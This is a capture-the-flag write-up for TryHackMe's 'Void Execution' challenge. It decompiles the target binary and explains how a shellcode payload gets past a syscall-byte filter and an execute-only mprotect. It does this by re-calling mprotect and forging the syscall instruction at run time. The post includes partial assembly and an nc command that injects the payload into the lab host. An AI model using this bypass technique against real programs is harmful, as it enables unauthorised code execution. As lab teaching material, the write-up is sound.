---
layout: post
title: TryHackMe - "Void Execution"
categories: Challenges
tags: red-team pen-testing 
---
[Link to the challenge](https://tryhackme.com/room/hfb1voidexecution)

## Intro

This challenge seems simple on the surface, but it's a bit tricky because it requires familiarity with what happens "behind the scenes" at architectural level during binary code execution.

The target program "voidexec" returns a segmentation fault on every user input.

We have the Linux executable file, but we don't have the source code, so we can't easily understand how the program works.

This initial obstacle, however, can reasonably be overcome by using "ghidra" to decompile the executable file and obtain the corresponding assembly code, as well as higher-level C-style code.
The resulting decompiled code is as follows:

    undefined8 main(void)

    {
    char cVar1;
    code *__s;
    
    setup();
    __s = (code *)mmap((void *)0xc0de0000,100,7,0x22,-1,0);
    memset(__s,0,100);
    puts("\nSend to void execution: ");
    read(0,__s,100);
    puts("\nvoided!\n");
    cVar1 = forbidden(__s);
    if (cVar1 != '\0') {
                        /* WARNING: Subroutine does not return */
        exit(1);
    }
    mprotect(__s,100,4);
    (*__s)();
    return 0;
    }

In short, "mmap" function creates a memory segment/buffer of length 100 at absolute address 0xc0de0000.

This segment is populated with user input, using the read function.

The pointer to this buffer is called "__s".
At the end of the "main", we notice that this segment is executed via a function call (the code execution jumps to the segment address).

At first glance, we think the exploit is very simple: simply construct a binary payload with msfvenom and inject it into standard input (by executing "./voidexec < payload.bin").

However, there are two major obstacles.

- The first obstacle is "forbidden" function, which we do not report for simplicity, but which is fundamental, as it blocks the program by returning "forbidden" if any bytes in the memory segment are equal to "0x0f" (or equal to some others special chars like "0xcd"). We remember that "0x0f" comes into play in syscall calls (0x0f05), and so the program rejects all "syscall" based payload: it rejects all evil payloads (since any shell or command we would like to execute requires "syscall" instruction, or other similar instructions, and these instructions are rejected, due to character checking, operated by the forbidden function mentioned above).

- The second obstacle is the function called near the end, just before the memory segment is executed. This function is "mprotect", which in our case makes the segment executable-only (third argument is value 4, PROT_EXEC), and not writable unfortunately. Thus, it is not possible to create encoded payloads to bypass bad character checking, and it is not possible to construct dynamic payloads at runtime (with the purpose of inserting the "syscall" instruction at the end, at runtime).

But there is an hack to resolve these problems!

## Payload development

We want to build a payload that first makes the memory segment writable, so we can insert the "syscall" instruction at runtime.

The trick is to call "mprotect" function again with third argument equal to 7 (permissions "rwx") to make the segment writable.

But how do we do it? Remember that toward the end, execution jumps to our memory segment as if it were a function call, so at runtime, in the current stack frame, as the bottommost element, we find the return address (to the caller, "main").
We fetch it and use it to calculate "mprotect" address, located a little above, and jump to it, obviously after configuring the registers so that the third argument of mprotect function is equal to 7 (rwx).

Now, execution will proceed again, jumping to the memory segment. At this point, we'll execute some instructions to start a shell. After that, at run-time, we'll insert the "syscall" instruction (0x0f05) with a specific argument (3b, "execve") at the end.

Here's the assembly code. We're showing the entire code, except for the shell construction, to avoid giving away too many spoilers. :)

    BITS 64;
    global    _start

    section   .text
    _start: pop r10
            cmp     rbx, 0x1 
            je      shell
            mov     rbx, 0x1
            mov     rax, 0xc0de0000
            mov     rdx, 0x7        ; "rwx" value for mprotect  
            sub     r10, 0x12
            jmp     r10             ; jump to altered ret address (mprotect)
    shell:  
            ; shell building, we don't give spoiler
            ; shell building, we don't give spoiler
            ; shell building, we don't give spoiler
            ; shell building, we don't give spoiler
            ; shell building, we don't give spoiler
            mov al, 0x0e                ; we forge "syscall" (0x0f05) instruction at run-time
            add al, 0x1
            mov ah, 0x05
            lea r10, [rel endlab]       
            add r10, 0x4                ; r10 = endlab addr + 4
            mov word [r10], ax          ; we insert 0x0f05 at address endlab+4 
            jmp endlab
    endlab: mov al, 0x3b
            mov ah, 0x0
            nop
            nop
            nop
            nop
            nop

Next, we compile this code and use it as payload for the target program, obtaining a shell, which allows us to navigate in the server directory and find the flag.

`(cat payload_sh.bin; cat) | nc voidexec.tryhackme.local 9008`